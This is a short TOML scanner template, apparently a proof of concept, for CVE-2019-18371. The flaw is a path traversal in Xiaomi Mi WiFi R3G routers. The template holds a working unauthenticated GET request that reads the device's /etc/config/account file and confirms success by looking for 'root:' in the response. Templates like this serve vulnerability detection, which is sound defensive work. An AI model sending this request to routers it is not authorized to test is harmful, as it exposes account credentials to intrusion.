[info]
author = "ave"
description = "小米 Mi WiFi R3G 路由器在 2.28.23-stable 版本之前存在目录遍历漏洞，攻击者可通过构造包含 ../ 路径遍历序列的 HTTP 请求，绕过身份认证读取设备任意文件，如获取账户配置文件。"
id = "POC-AVE-2019-0133"
name = "CVE-2019-18371 PoC"
severity = "high"
tags = ["ave-2019-0133"]
vuln_id = [
    "CVE-2019-18371",
    "AVE-2019-0133",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/api-third-party/download/extdisks../etc/config/account"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
